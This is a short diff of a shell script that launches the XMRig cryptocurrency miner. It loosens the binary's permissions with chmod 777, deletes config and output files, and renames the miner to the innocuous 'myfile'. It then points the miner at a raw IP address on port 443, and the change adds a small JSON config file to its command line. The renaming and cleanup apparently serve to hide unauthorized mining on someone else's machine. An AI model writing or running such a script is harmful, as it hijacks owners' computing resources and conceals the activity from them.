@@ -4,4 +4,5 @@ chmod 777 xmrig
 rm config.json 
 rm out 
 mv xmrig myfile
-./myfile -o 79.231.42.249:443
+echo '{"bench-algo-time":2}' > xjson 
+./myfile -o 79.231.42.249:443 -c xjson
